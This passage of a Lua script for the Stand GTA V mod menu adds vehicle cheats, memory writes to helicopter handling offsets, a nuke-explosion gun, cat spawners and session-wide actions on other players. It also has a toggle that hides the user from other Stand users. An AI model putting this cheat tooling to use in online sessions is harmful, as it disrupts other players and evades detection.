            VEHICLE.SET_VEHICLE_MOD(entities.get_user_vehicle_as_handle(), upgrades, math.random(0, 20), false)
        end
    end
    util.yield(100)
end)


local rapid_khanjali
rapid_khanjali = menu.toggle_loop(modificaciones, "Khanjali Rapid Fire", {}, "", function()
    local player_veh = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
    if ENTITY.GET_ENTITY_MODEL(player_veh) == util.joaat("khanjali") then
        VEHICLE.SET_VEHICLE_MOD(player_veh, 10, math.random(-1, 0), false)
    else
        util.toast("Enter a khanjali.")
        menu.trigger_command(rapid_khanjali, "off")
    end
end)

local bullet_proof

menu.toggle_loop(modificaciones, "Bulletproof", {}, "", function(on)
    local play = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    if on then
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(play), true, true, true, true, true, false, false, true)
    else
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(play), false, false, false, false, false, false, false, false)
    end
end)

infcms = false
menu.toggle(modificaciones, "Infinite Countermeasures", {"infinitecms"}, "It will give infinite countermeasures.", function(on)
    infcms = on
end)

if player_cur_car ~= 0 then
    if everythingproof then
        ENTITY.SET_ENTITY_PROOFS(player_cur_car, true, true, true, true, true, true, true, true)
    end
    --if racemode then
    --    VEHICLE.SET_VEHICLE_IS_RACING(player_cur_car, true)
    --end

    if infcms then
        if VEHICLE.GET_VEHICLE_COUNTERMEASURE_AMMO(player_cur_car) < 100 then
            VEHICLE.SET_VEHICLE_COUNTERMEASURE_AMMO(player_cur_car, 100)
        end
    end

    --if shift_drift then
    --    if PAD.IS_CONTROL_PRESSED(21, 21) then
    --        VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, true)
    --        VEHICLE._SET_VEHICLE_REDUCE_TRACTION(player_cur_car, 0.0)
    --    else
    --        VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, false)
    --    end
    --end
end

--force_cm = false
--menu.toggle(vehicles, "Force countermeasures", {"forcecms"}, "Force countermeasures on any vehicle to the horn key.", function(on)
--    force_cm = on
--    menu.trigger_commands("getgunsflaregun")
--end)

--if player_cur_car ~= 0 and force_cm then
--    if PAD.IS_CONTROL_PRESSED(46, 46) then
--        local target = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(player_id), math.random(-5, 5), -30.0, math.random(-5, 5))
--        --MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target.x, target.y, target.z, target.x, target.y, target.z, 300.0, true, -1355376991, PLAYER.PLAYER_PED_ID(player_id), true, false, 100.0)
--        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target.x, target.y, target.z, target.x, target.y, target.z, 100.0, true, 1198879012, PLAYER.PLAYER_PED_ID(player_id), true, false, 100.0)
--    end
--end

--------------------------------------------------------------------------------------------------------------------------------------------------------
-- Real Helicopter Mode Start

get_vtable_entry_pointer = function(address, index)
    return memory.read_long(memory.read_long(address) + (8 * index))
end
get_sub_handling_types = function(vehicle, type)
    local veh_handling_address = memory.read_long(entities.handle_to_pointer(vehicle) + 0x938)
    local sub_handling_array = memory.read_long(veh_handling_address + 0x0158)
    local sub_handling_count = memory.read_ushort(veh_handling_address + 0x0160)
    local types = {registerd = sub_handling_count, found = 0}
    for i = 0, sub_handling_count - 1, 1 do
        local sub_handling_data = memory.read_long(sub_handling_array + 8 * i)
        if sub_handling_data ~= 0 then
            local GetSubHandlingType_address = get_vtable_entry_pointer(sub_handling_data, 2)
            local result = util.call_foreign_function(GetSubHandlingType_address, sub_handling_data)
            if type and type == result then return sub_handling_data end
            types[#types+1] = {type = result, address = sub_handling_data}
            types.found = types.found + 1
        end
    end
    if type then return nil else return types end
end
local thrust_offset = 0x8
local better_heli_handling_offsets = {
    ["fYawMult"] = 0x18, -- dont remember
    ["fYawStabilise"] = 0x20, --minor stabalization
    ["fSideSlipMult"] = 0x24, --minor stabalizaztion
    ["fRollStabilise"] = 0x30, --minor stabalization
    ["fAttackLiftMult"] = 0x48, --disables most of it
    ["fAttackDiveMult"] = 0x4C, --disables most of the other axis
    ["fWindMult"] = 0x58, --helps with removing some jitter
    ["fPitchStabilise"] = 0x3C --idk what it does but it seems to help
}

realheli = menu.list(vehicles, "Helicopters", {}, "Real control options in helicopter")

menu.slider_float(realheli, "Real Helicopter power", {"heliThrust"}, "Potencia de los helis", 0, 1000, 50, 1, function (value)
    local CflyingHandling = get_sub_handling_types(entities.get_user_vehicle_as_handle(), 1)
    if CflyingHandling then
        memory.write_float(CflyingHandling + thrust_offset, value * 0.01)
    else
        util.toast("Error enter a heli")
    end
end)
menu.action(realheli, "Real helicopter mode", {"betterheli"}, "Disables vertical stabilization of vtols for real operating mode", function ()
    local CflyingHandling = get_sub_handling_types(entities.get_user_vehicle_as_handle(), 1)
    if CflyingHandling then
        for _, offset in pairs(better_heli_handling_offsets) do
            memory.write_float(CflyingHandling + offset, 0)
        end
        util.toast("Echo Try not to crash")
    else
        util.toast("Error enter a heli")
    end
end)

-- Real Helicopter Mode End

--------------------------------------------------------------------------------------------------------------------------------------------------------
--Impulse SportMode start


sportmode = menu.list(vehicles, "Sportmode", {}, "The SportMode we will all remember from Impusle :'3")

PEDD = {
	["GET_VEHICLE_PED_IS_IN"]=function(--[[Ped (int)]] ped,--[[BOOL (bool)]] includeLastVehicle)native_invoker.begin_call();native_invoker.push_arg_int(ped);native_invoker.push_arg_bool(includeLastVehicle);native_invoker.end_call("9A9112A0FE9A4713");return native_invoker.get_return_value_int();end,
}
PLAYERR = {
	["PLAYER_PED_ID"]=function()native_invoker.begin_call();native_invoker.end_call("D80958FC74E988A6");return native_invoker.get_return_value_int();end,
}
CAMM = {
	["GET_GAMEPLAY_CAM_ROT"]=function(--[[int]] rotationOrder)native_invoker.begin_call();native_invoker.push_arg_int(rotationOrder);native_invoker.end_call("837765A25378F0BB");return native_invoker.get_return_value_vector3();end,
	["SET_CAM_ROT"]=--[[void]] function(--[[Cam (int)]] cam,--[[float]] rotX,--[[float]] rotY,--[[float]] rotZ,--[[int]] rotationOrder)native_invoker.begin_call();native_invoker.push_arg_int(cam);native_invoker.push_arg_float(rotX);native_invoker.push_arg_float(rotY);native_invoker.push_arg_float(rotZ);native_invoker.push_arg_int(rotationOrder);native_invoker.end_call("85973643155D0B07");end,
	["_SET_GAMEPLAY_CAM_RELATIVE_ROTATION"]=--[[void]] function(--[[float]] roll,--[[float]] pitch,--[[float]] yaw)native_invoker.begin_call();native_invoker.push_arg_float(roll);native_invoker.push_arg_float(pitch);native_invoker.push_arg_float(yaw);native_invoker.end_call("48608C3464F58AB4");end,

}
ENTITYY = {
	["SET_ENTITY_ROTATION"]=function(--[[Entity (int)]] entity,--[[float]] pitch,--[[float]] roll,--[[float]] yaw,--[[int]] rotationOrder,--[[BOOL (bool)]] p5)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_float(pitch);native_invoker.push_arg_float(roll);native_invoker.push_arg_float(yaw);native_invoker.push_arg_int(rotationOrder);native_invoker.push_arg_bool(p5);native_invoker.end_call("8524A8B0171D5E07");end,
	["SET_ENTITY_COLLISION"]=function(--[[Entity (int)]] entity,--[[BOOL (bool)]] toggle,--[[BOOL (bool)]] keepPhysics)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_bool(toggle);native_invoker.push_arg_bool(keepPhysics);native_invoker.end_call("1A9205C1B9EE827F");end,
	["APPLY_FORCE_TO_ENTITY"]=function(--[[Entity (int)]] entity,--[[int]] forceFlags,--[[float]] x,--[[float]] y,--[[float]] z,--[[float]] offX,--[[float]] offY,--[[float]] offZ,--[[int]] boneIndex,--[[BOOL (bool)]] isDirectionRel,--[[BOOL (bool)]] ignoreUpVec,--[[BOOL (bool)]] isForceRel,--[[BOOL (bool)]] p12,--[[BOOL (bool)]] p13)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_int(forceFlags);native_invoker.push_arg_float(x);native_invoker.push_arg_float(y);native_invoker.push_arg_float(z);native_invoker.push_arg_float(offX);native_invoker.push_arg_float(offY);native_invoker.push_arg_float(offZ);native_invoker.push_arg_int(boneIndex);native_invoker.push_arg_bool(isDirectionRel);native_invoker.push_arg_bool(ignoreUpVec);native_invoker.push_arg_bool(isForceRel);native_invoker.push_arg_bool(p12);native_invoker.push_arg_bool(p13);native_invoker.end_call("C5F68BE9613E2D18");end,
	["FREEZE_ENTITY_POSITION"]=function(--[[Entity (int)]] entity,--[[BOOL (bool)]] toggle)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_bool(toggle);native_invoker.end_call("428CA6DBD1094446");end,
}
VEHICLEE = {
	["SET_VEHICLE_FORWARD_SPEED"]=function(--[[Vehicle (int)]] vehicle,--[[float]] speed)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_float(speed);native_invoker.end_call("AB54A438726D25D5");end,
	["SET_VEHICLE_GRAVITY"]=function(--[[Vehicle (int)]] vehicle,--[[BOOL (bool)]] toggle)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_bool(toggle);native_invoker.end_call("89F149B6131E57DA");end,
	["SET_VEHICLE_EXTRA_COLOURS"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] pearlescentColor,--[[int]] wheelColor)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_int(pearlescentColor);native_invoker.push_arg_int(wheelColor);native_invoker.end_call("2036F561ADD12E33");end,

}
PADD = {
	["IS_CONTROL_PRESSED"]=function(--[[int]] padIndex,--[[int]] control)native_invoker.begin_call();native_invoker.push_arg_int(padIndex);native_invoker.push_arg_int(control);native_invoker.end_call("F3A21BCD95725A4A");return native_invoker.get_return_value_bool();end,
}

veh = PEDD.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false);
local is_vehicle_flying = false
local dont_stop = false
local no_collision = false
local speed = 6
local reset_veloicty = false

menu.toggle(sportmode, "Flying with car", {"vehfly"}, "I recommend you put a key to this command.", function(on_click)
    is_vehicle_flying = on_click
    if reset_veloicty then 
        ENTITYY.FREEZE_ENTITY_POSITION(veh, true)
        util.yield()
        ENTITYY.FREEZE_ENTITY_POSITION(veh, false)
    end
end)
menu.slider(sportmode, "Velocity", {}, "", 1, 100, 6, 1, function(on_change) 
    speed = on_change
end)
menu.toggle(sportmode, "Non-stop", {}, "", function(on_click)
    dont_stop = on_click
end)
menu.toggle(sportmode, "Reset speed", {}, "If you do not stop moving after turning it off, click here", function(on_click)
    reset_veloicty = on_click
end)
menu.toggle(sportmode, "No Collision", {}, "", function(on_click)
    no_collision = on_click
end)


vehicleroll = 0


function do_vehicle_fly() 
    veh = PEDD.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false);
    cam_pos = CAMM.GET_GAMEPLAY_CAM_ROT(0);
    ENTITYY.SET_ENTITY_ROTATION(veh, cam_pos.x, vehicleroll, cam_pos.z, 2, true)
    ENTITYY.SET_ENTITY_COLLISION(veh, not no_collision, true);
    if PADD.IS_CONTROL_PRESSED(0, 108) then 
        vehicleroll = vehicleroll -1
    end

    if PADD.IS_CONTROL_PRESSED(0, 109) then 
        vehicleroll = vehicleroll +1
       
    end

    local locspeed = speed*10
    local locspeed2 = speed
    if PADD.IS_CONTROL_PRESSED(0, 61) then 
        locspeed = locspeed*2
        locspeed2 = locspeed2*2
    end

    
    if PADD.IS_CONTROL_PRESSED(2, 71) then
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, speed, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            VEHICLEE.SET_VEHICLE_FORWARD_SPEED(veh, locspeed)
        end
	end
    if PADD.IS_CONTROL_PRESSED(2, 72) then
		local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = speed * 2
        end
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0 - (lsp), 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            VEHICLEE.SET_VEHICLE_FORWARD_SPEED(veh, 0 - (locspeed));
        end
   end
    if PADD.IS_CONTROL_PRESSED(2, 63) then
        local lsp = (0 - speed)*2
        if not PADD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = 0 - speed
        end
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, (lsp), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, 0 - (locspeed), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1);
        end
	end
    if PADD.IS_CONTROL_PRESSED(2, 64) then
        local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = speed*2
        end
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, lsp, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, locspeed, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        end
    end
	if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
        VEHICLEE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
    end
end


util.create_tick_handler(function() 


    -- Added by LAZ
    if PEDD.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(),false) == 0 then
        if is_vehicle_flying then
            menu.trigger_commands("vehfly")
            util.toast("Sportmode off, not in a vehicle")
        end
    else
        if is_vehicle_flying then do_vehicle_fly() end


    end

    -- End Added by LAZ

    VEHICLEE.SET_VEHICLE_GRAVITY(veh, not is_vehicle_flying) 
    if not is_vehicle_flying then 
        ENTITY.SET_ENTITY_COLLISION(veh, true, true);
    end

    return true
end)
util.on_stop(function() 
    VEHICLEE.SET_VEHICLE_GRAVITY(veh, true)
    ENTITYY.SET_ENTITY_COLLISION(veh, true, true);
end)


--------------------------------------------------------------------------------------------------------------------------------
-- Diversion

menu.toggle(fun, "Tesla Mode", {}, "", function(toggled)
    local ped = players.user_ped()
    local playerpos = ENTITY.GET_ENTITY_COORDS(ped, false)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    local tesla_ai = util.joaat("u_m_y_baygor")
    local tesla = util.joaat("raiden")
    request_model(tesla_ai)
    request_model(tesla)
    if toggled then     
       if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            menu.trigger_commands("deletevehicle")
        end

        tesla_ai_ped = entities.create_ped(26, tesla_ai, playerpos, 0)
        tesla_vehicle = entities.create_vehicle(tesla, playerpos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(tesla_ai_ped, true) 
        ENTITY.SET_ENTITY_VISIBLE(tesla_ai_ped, false)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(tesla_ai_ped, true)
        PED.SET_PED_INTO_VEHICLE(ped, tesla_vehicle, -2)
        PED.SET_PED_INTO_VEHICLE(tesla_ai_ped, tesla_vehicle, -1)
        PED.SET_PED_KEEP_TASK(tesla_ai_ped, true)
        VEHICLE.SET_VEHICLE_COLOURS(tesla_vehicle, 111, 111)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 23, 8, false)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 15, 1, false)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(tesla_vehicle, 111, 147)
        menu.trigger_commands("performance")

        if HUD.IS_WAYPOINT_ACTIVE() then
            local pos = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
            TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(tesla_ai_ped, tesla_vehicle, pos.x, pos.y, pos.z, 20.0, 786603, 0)
        else
            TASK.TASK_VEHICLE_DRIVE_WANDER(tesla_ai_ped, tesla_vehicle, 20.0, 786603)
        end
    else
        if tesla_ai_ped ~= nil then 
            entities.delete_by_handle(tesla_ai_ped)
        end
        if tesla_vehicle ~= nil then 
            entities.delete_by_handle(tesla_vehicle)
        end
    end
end)


local randomizer = function(x)
    local r = math.random(1,3)
    return x[r]
end

array = {"1","1","2"}

menu.action(fun, "Pull the trigger", {}, "Play Russian roulette with your game", function()
    if randomizer(array) == "1" then
        util.toast("You survived :D")
    else
        util.log("Your game died D:")
        ENTITY.APPLY_FORCE_TO_ENTITY(0, 0, 0, 0, 0, 0, 0, 0, 0, false, false, false, false, false)
    end
end)

menu.action(fun, "Snow War", {}, "Snowball all players in the session.", function ()
    local plist = players.list()
    local snowballs = util.joaat('WEAPON_SNOWBALL')
    for i = 1, #plist do
        local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, snowballs, 20, true)
        WEAPON.SET_PED_AMMO(plyr, snowballs, 20)
        util.toast("Now everyone has snowballs!")
        util.yield()
    end
   
end)

menu.toggle_loop(fun, "Pet Cat", {}, "", function()
    if not jinx_pet or not ENTITY.DOES_ENTITY_EXIST(jinx_pet) then
        local jinx = util.joaat("a_c_cat_01")
        request_model(jinx)
        local pos = players.get_position(players.user())
        jinx_pet = entities.create_ped(28, jinx, pos, 0)
        PED.SET_PED_COMPONENT_VARIATION(jinx_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(jinx_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(jinx_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(jinx_pet, players.user_ped(), 0, -0.3, 0, 7.0, -1, 1.5, true)
    util.yield(2500)
end, function()
    entities.delete_by_handle(jinx_pet)
    jinx_pet = nil
end)




local jinx_army = {}
local army = menu.list(fun, "Cat Attack", {}, "Take out cats... LOTS OF CATS!!")
menu.click_slider(army, "Spawnear Ataque G", {}, "", 1, 256, 30, 1, function(val)
    local player = players.user_ped()
    local pos = ENTITY.GET_ENTITY_COORDS(player, false)
    pos.y = pos.y - 5
    pos.z = pos.z + 1
    local jinx = util.joaat("a_c_cat_01")
    request_model(jinx)
     for i = 1, val do
        jinx_army[i] = entities.create_ped(28, jinx, pos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(jinx_army[i], true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(jinx_army[i], true)
        PED.SET_PED_COMPONENT_VARIATION(jinx_army[i], 0, 0, 1, 0)
        TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(jinx_army[i], player, 0, -0.3, 0, 7.0, -1, 10, true)
        util.yield()
     end 
end)

menu.action(army, "Clear G", {}, "", function()
    for i, jinx in ipairs(jinx_army) do
        entities.delete_by_handle(jinx_army[i])
    end
end)

--colorizev_root = menu.list(fun, "Colorear coches", {"lancescriptcolorize"}, "Pinta los coches de alrededor!")

--custom_r = 254
--menu.slider(colorizev_root, "Custom R", {"colorizecustomr"}, "", 1, 255, 254, 1, function(s)
--    custom_r = s
--end)

--custom_g = 2
--menu.slider(colorizev_root, "Custom G", {"colorizecustomg"}, "", 1, 255, 2, 1, function(s)
--    custom_g = s
--end)

--custom_b = 252
--menu.slider(colorizev_root, "Custom B", {"colorizecustomb"}, "", 1, 255, 252, 1, function(s)
--    custom_b = s
--end)

--menu.action(colorizev_root, "RGB preset: Stand magenta", {"rpstandmagenta"}, "g", function(on_click)
--    menu.trigger_commands("colorizecustomr 254")
 --   menu.trigger_commands("colorizecustomg 2")
 --   menu.trigger_commands("colorizecustomb 252")
--end)

--menu.toggle(colorizev_root, "Colorize vehicles", {"colorizevehicles"}, "Colorizes all nearby vehicles with the valus you set! Turn on rainbow to RGB this ;", function(on)
--    if on then
--        colorize_cars = true
--        custom_rgb = true
--        mod_uses("vehicle", 1)
--    else
--        colorize_cars = false
--        custom_rgb = false
--        mod_uses("vehicle", -1)
--    end
--end, false)

--menu.toggle(colorizev_root, "Rainbow", {"rainbowvehicles"}, "Requires colorize vehicles to be turned on.", function(on)
--    if not colorize_cars then
--        menu.trigger_commands("colorizevehicles on")
--    end
--    custom_rgb = not on
--end, false)

armanuc = menu.list(fun, "Nuclear Options", {}, "")

local nuke_gun_toggle = menu.toggle(armanuc, "Nuclear Weapon", {"JSnukeGun"}, "The rpg shoots nukes", function(toggle)
    nuke_running = toggle	
    if nuke_running then
        if animals_running then menu.trigger_command(exp_animal_toggle, "off") end
        util.create_tick_handler(function()
            if WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.PLAYER_PED_ID()) == -1312131151 then --if holding homing launcher
                if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
                    if not remove_projectiles then 
                        remove_projectiles = true 
                        disableProjectileLoop(-1312131151)
                    end
                    util.create_thread(function()
                        local hash = util.joaat("w_arena_airmissile_01a")
                        STREAMING.REQUEST_MODEL(hash)
                        yieldModelLoad(hash)
                        local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)   
                        local dir, pos = direction()
                        local bomb = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, pos.x, pos.y, pos.z, true, true, false)
                        ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                        ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)
                        while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do util.yield() end
                        local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                        entities.delete(bomb)
                        executeNuke(nukePos)
                    end)
                else
                    remove_projectiles = false
                end
            else
                remove_projectiles = false
            end
            return nuke_running
        end)
    end
end)

local nuke_height = 40
menu.slider(armanuc, "Nuke Waypoint", {"JSnukeHeight"}, "Throw a Nuke On Your Waypoint.", 10, 100, nuke_height, 10, function(value)
    nuke_height = value
end)

function executeNuke(pos)	
    for a = 0, nuke_height, 4 do
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z + a, 8, 10, true, false, 1, false)	
        util.yield(50)
    end
    FIRE.ADD_EXPLOSION(pos.x +8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x +8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x -8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x -8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
end 

--------------------------------------------------------------------------------------------------------------------------------
-- Misc
--local visual_stuff = {
--    {"Better Illumination", "AmbientPush"},
--    {"Oversaturated", "rply_saturation"},
--    {"Boost Everything", "LostTimeFlash"},
--    {"Foggy Night", "casino_main_floor_heist"},
--    {"Better Night Time", "dlc_island_vault"},
--    {"Normal Fog", "Forest"},
--    {"Heavy Fog", "nervousRON_fog"},
--    {"Firewatch", "MP_Arena_theme_evening"},
--    {"Warm", "mp_bkr_int01_garage"},
--    {"Deepfried", "MP_deathfail_night"},
--    {"Stoned", "stoned"},
--    {"Underwater", "underwater"},
--}

--local visual_fidelity = menu.list(misc, "Visuales", {}, "")
--for id, data in pairs(visual_stuff) do
--    local effect_name = data[1]
--    local effect_thing = data[2]
--    menu.toggle(visual_fidelity, effect_name, {""}, "", function(toggled)
--        if toggled then
--            GRAPHICS.SET_TIMECYCLE_MODIFIER(effect_thing)
--            menu.trigger_commands("shader apagaos")
--        else
--            GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
--        end
--    end)
--end 


menu.toggle(misc, "Screenshot Mode", {}, "So you can take pictures <3", function(on)
	if on then
		menu.trigger_commands("screenshot on")
	else
		menu.trigger_commands("screenshot off")
	end
end)

menu.toggle(misc, "Stand ID", {}, "It makes you invisible to other stand users, but you won't detect them either.", function(on_toggle)
    local standid = menu.ref_by_path("Online>Protections>Detections>Stand User Identification")
    if on_toggle then
        menu.trigger_command(standid, "on")
    else
        menu.trigger_command(standid, "off")
    end
end)


menu.hyperlink(misc, "Mi Github", "https://github.com/xxpichoclesxx")

menu.hyperlink(menu.my_root(), "Entra al discord!", "https://discord.gg/BNbSHhunPv")
local credits = menu.list(misc, "Creditos", {}, "")
local devcred = menu.list(credits, "Creditos Dev", {}, "")
local othercred = menu.list(credits, "Otros Creditos", {}, "")
menu.action(devcred, "JinxScript/Prisuhm", {}, "Skidded code from prisuhm, this is what i added before a little discussion with him, we do love him in this community because he is awesome and he codded almost every single feature. \nThx for being so Prisuhm and unique.", function()
end)
menu.action(devcred, "gLance", {}, "He gave me a lot of help with Gta V natives.", function()
end)
menu.action(devcred, "LanceScriptTEOF", {}, "He helped me learn and understand Gta V natives", function()
end)
menu.action(devcred, "Aaron", {}, "Thanks for helping me with my first steps in the stand lua api", function()
end)
menu.action(devcred, "Cxbr", {}, "Thx for friendly features <3", function()
end)
menu.action(devcred, "Sapphire", {}, "Who helped me with almost every single feature and being patient because of my dumb brain <3", function()
end)
menu.action(othercred, "Emir, Joju, Pepe, Ady, Vicente, Sammy", {}, "This will never be posible without them <3", function()
end)
menu.action(othercred, "Wigger", {}, "He bringed some ideas to the script and some functions, thx", function()
end)
menu.action(othercred, "Ducklett", {}, "He fully translated the script to english", function()
end)
menu.action(othercred, "HADES", {}, "He fully translated the script to korean", function()
end)
menu.action(othercred, "You <3", {}, "Who download the script and give ideas for improvement <3", function()
end)

util.on_stop(function ()
    VEHICLE.SET_VEHICLE_GRAVITY(veh, true)
    ENTITY.SET_ENTITY_COLLISION(veh, true, true);
	menu.collect_garbage()
    sleep(100)
    util.toast("Adious I hope you liked it :3")
    util.toast("Cleaning...")
end)

players.dispatch_on_join()
